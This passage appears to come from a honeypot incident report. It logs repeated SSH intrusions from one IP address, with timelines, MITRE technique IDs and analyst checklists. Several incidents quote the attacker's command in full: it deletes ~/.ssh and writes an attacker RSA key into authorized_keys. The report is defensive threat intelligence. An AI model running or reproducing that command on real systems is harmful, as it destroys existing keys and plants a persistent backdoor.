| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:22:52` | `cowrie.session.connect` |
| `2026-05-03 22:22:52` | `cowrie.client.version` |
| `2026-05-03 22:22:52` | `cowrie.client.kex` |
| `2026-05-03 22:22:52` | `cowrie.login.success` |
| `2026-05-03 22:22:52` | `cowrie.session.params` |
| `2026-05-03 22:22:52` | `cowrie.command.input` |
| `2026-05-03 22:22:52` | `cowrie.command.failed` |
| `2026-05-03 22:22:52` | `cowrie.log.closed` |
| `2026-05-03 22:22:52` | `cowrie.session.params` |
| `2026-05-03 22:22:52` | `cowrie.command.input` |
| `2026-05-03 22:22:52` | `cowrie.session.file_download` |
| `2026-05-03 22:22:52` | `cowrie.log.closed` |
| `2026-05-03 22:22:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22f121992b6f

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:22 |
| **Last Seen** | 2026-05-03 22:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:22:53` | `cowrie.session.connect` |
| `2026-05-03 22:22:53` | `cowrie.client.version` |
| `2026-05-03 22:22:53` | `cowrie.client.kex` |
| `2026-05-03 22:22:54` | `cowrie.login.success` |
| `2026-05-03 22:22:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad1a69931670

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:23 |
| **Last Seen** | 2026-05-03 22:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:23:38` | `cowrie.session.connect` |
| `2026-05-03 22:23:38` | `cowrie.client.version` |
| `2026-05-03 22:23:38` | `cowrie.client.kex` |
| `2026-05-03 22:23:38` | `cowrie.login.success` |
| `2026-05-03 22:23:38` | `cowrie.session.params` |
| `2026-05-03 22:23:38` | `cowrie.command.input` |
| `2026-05-03 22:23:38` | `cowrie.command.failed` |
| `2026-05-03 22:23:38` | `cowrie.log.closed` |
| `2026-05-03 22:23:39` | `cowrie.session.params` |
| `2026-05-03 22:23:39` | `cowrie.command.input` |
| `2026-05-03 22:23:39` | `cowrie.session.file_download` |
| `2026-05-03 22:23:39` | `cowrie.log.closed` |
| `2026-05-03 22:23:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96cc7679e555

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:23 |
| **Last Seen** | 2026-05-03 22:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:23:40` | `cowrie.session.connect` |
| `2026-05-03 22:23:40` | `cowrie.client.version` |
| `2026-05-03 22:23:40` | `cowrie.client.kex` |
| `2026-05-03 22:23:40` | `cowrie.login.success` |
| `2026-05-03 22:23:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-428adfcf5724

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:24 |
| **Last Seen** | 2026-05-03 22:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:24:25` | `cowrie.session.connect` |
| `2026-05-03 22:24:25` | `cowrie.client.version` |
| `2026-05-03 22:24:25` | `cowrie.client.kex` |
| `2026-05-03 22:24:25` | `cowrie.login.success` |
| `2026-05-03 22:24:25` | `cowrie.session.params` |
| `2026-05-03 22:24:25` | `cowrie.command.input` |
| `2026-05-03 22:24:25` | `cowrie.command.failed` |
| `2026-05-03 22:24:25` | `cowrie.log.closed` |
| `2026-05-03 22:24:25` | `cowrie.session.params` |
| `2026-05-03 22:24:25` | `cowrie.command.input` |
| `2026-05-03 22:24:25` | `cowrie.session.file_download` |
| `2026-05-03 22:24:25` | `cowrie.log.closed` |
| `2026-05-03 22:24:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03e536deed4f

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:24 |
| **Last Seen** | 2026-05-03 22:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:24:26` | `cowrie.session.connect` |
| `2026-05-03 22:24:26` | `cowrie.client.version` |
| `2026-05-03 22:24:26` | `cowrie.client.kex` |
| `2026-05-03 22:24:26` | `cowrie.login.success` |
| `2026-05-03 22:24:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc83e2db3075

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:25 |
| **Last Seen** | 2026-05-03 22:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:25:11` | `cowrie.session.connect` |
| `2026-05-03 22:25:11` | `cowrie.client.version` |
| `2026-05-03 22:25:11` | `cowrie.client.kex` |
| `2026-05-03 22:25:11` | `cowrie.login.success` |
| `2026-05-03 22:25:11` | `cowrie.session.params` |
| `2026-05-03 22:25:11` | `cowrie.command.input` |
| `2026-05-03 22:25:11` | `cowrie.command.failed` |
| `2026-05-03 22:25:11` | `cowrie.log.closed` |
| `2026-05-03 22:25:11` | `cowrie.session.params` |
| `2026-05-03 22:25:11` | `cowrie.command.input` |
| `2026-05-03 22:25:11` | `cowrie.session.file_download` |
| `2026-05-03 22:25:11` | `cowrie.log.closed` |
| `2026-05-03 22:25:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d93edd55434e

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:25 |
| **Last Seen** | 2026-05-03 22:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:25:12` | `cowrie.session.connect` |
| `2026-05-03 22:25:12` | `cowrie.client.version` |
| `2026-05-03 22:25:12` | `cowrie.client.kex` |
| `2026-05-03 22:25:13` | `cowrie.login.success` |
| `2026-05-03 22:25:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e764640bdbc

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:25 |
| **Last Seen** | 2026-05-03 22:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:25:57` | `cowrie.session.connect` |
| `2026-05-03 22:25:57` | `cowrie.client.version` |
| `2026-05-03 22:25:57` | `cowrie.client.kex` |
| `2026-05-03 22:25:57` | `cowrie.login.success` |
| `2026-05-03 22:25:57` | `cowrie.session.params` |
| `2026-05-03 22:25:57` | `cowrie.command.input` |
| `2026-05-03 22:25:57` | `cowrie.command.failed` |
| `2026-05-03 22:25:57` | `cowrie.log.closed` |
| `2026-05-03 22:25:57` | `cowrie.session.params` |
| `2026-05-03 22:25:57` | `cowrie.command.input` |
| `2026-05-03 22:25:57` | `cowrie.session.file_download` |
| `2026-05-03 22:25:57` | `cowrie.log.closed` |
| `2026-05-03 22:25:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9892ddb83c29

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:25 |
| **Last Seen** | 2026-05-03 22:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:25:58` | `cowrie.session.connect` |
| `2026-05-03 22:25:58` | `cowrie.client.version` |
| `2026-05-03 22:25:58` | `cowrie.client.kex` |
| `2026-05-03 22:25:58` | `cowrie.login.success` |
| `2026-05-03 22:25:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-256826bcf571

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:26 |
| **Last Seen** | 2026-05-03 22:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:26:41` | `cowrie.session.connect` |
| `2026-05-03 22:26:41` | `cowrie.client.version` |
| `2026-05-03 22:26:41` | `cowrie.client.kex` |
| `2026-05-03 22:26:41` | `cowrie.login.success` |
| `2026-05-03 22:26:41` | `cowrie.session.params` |
| `2026-05-03 22:26:41` | `cowrie.command.input` |
| `2026-05-03 22:26:41` | `cowrie.command.failed` |
| `2026-05-03 22:26:41` | `cowrie.log.closed` |
| `2026-05-03 22:26:41` | `cowrie.session.params` |
| `2026-05-03 22:26:41` | `cowrie.command.input` |
| `2026-05-03 22:26:41` | `cowrie.session.file_download` |
| `2026-05-03 22:26:41` | `cowrie.log.closed` |
| `2026-05-03 22:26:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88b9752d844f

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:26 |
| **Last Seen** | 2026-05-03 22:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:26:42` | `cowrie.session.connect` |
| `2026-05-03 22:26:42` | `cowrie.client.version` |
| `2026-05-03 22:26:42` | `cowrie.client.kex` |
| `2026-05-03 22:26:42` | `cowrie.login.success` |
| `2026-05-03 22:26:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fe1db0d558e

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:27 |
| **Last Seen** | 2026-05-03 22:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:27:24` | `cowrie.session.connect` |
| `2026-05-03 22:27:24` | `cowrie.client.version` |
| `2026-05-03 22:27:24` | `cowrie.client.kex` |
| `2026-05-03 22:27:24` | `cowrie.login.success` |
| `2026-05-03 22:27:24` | `cowrie.session.params` |
| `2026-05-03 22:27:24` | `cowrie.command.input` |
| `2026-05-03 22:27:24` | `cowrie.command.failed` |
| `2026-05-03 22:27:25` | `cowrie.log.closed` |
| `2026-05-03 22:27:25` | `cowrie.session.params` |
| `2026-05-03 22:27:25` | `cowrie.command.input` |
| `2026-05-03 22:27:25` | `cowrie.session.file_download` |
| `2026-05-03 22:27:25` | `cowrie.log.closed` |
| `2026-05-03 22:27:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34953b8f4f5d

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:27 |
| **Last Seen** | 2026-05-03 22:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:27:26` | `cowrie.session.connect` |
| `2026-05-03 22:27:26` | `cowrie.client.version` |
| `2026-05-03 22:27:26` | `cowrie.client.kex` |
| `2026-05-03 22:27:26` | `cowrie.login.success` |
| `2026-05-03 22:27:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-313d06ec0bd7

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:28 |
| **Last Seen** | 2026-05-03 22:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:28:55` | `cowrie.session.connect` |
| `2026-05-03 22:28:55` | `cowrie.client.version` |
| `2026-05-03 22:28:55` | `cowrie.client.kex` |
| `2026-05-03 22:28:55` | `cowrie.login.success` |
| `2026-05-03 22:28:56` | `cowrie.session.params` |
| `2026-05-03 22:28:56` | `cowrie.command.input` |
| `2026-05-03 22:28:56` | `cowrie.command.failed` |
| `2026-05-03 22:28:56` | `cowrie.log.closed` |
| `2026-05-03 22:28:56` | `cowrie.session.params` |
| `2026-05-03 22:28:56` | `cowrie.command.input` |
| `2026-05-03 22:28:56` | `cowrie.session.file_download` |
| `2026-05-03 22:28:56` | `cowrie.log.closed` |
| `2026-05-03 22:28:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-558de4127b6b

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:28 |
| **Last Seen** | 2026-05-03 22:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:28:57` | `cowrie.session.connect` |
| `2026-05-03 22:28:57` | `cowrie.client.version` |
| `2026-05-03 22:28:57` | `cowrie.client.kex` |
| `2026-05-03 22:28:57` | `cowrie.login.success` |
| `2026-05-03 22:28:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84c261fc765d

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:29 |
| **Last Seen** | 2026-05-03 22:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:29:41` | `cowrie.session.connect` |
| `2026-05-03 22:29:41` | `cowrie.client.version` |
| `2026-05-03 22:29:41` | `cowrie.client.kex` |
| `2026-05-03 22:29:41` | `cowrie.login.success` |
| `2026-05-03 22:29:41` | `cowrie.session.params` |
| `2026-05-03 22:29:41` | `cowrie.command.input` |
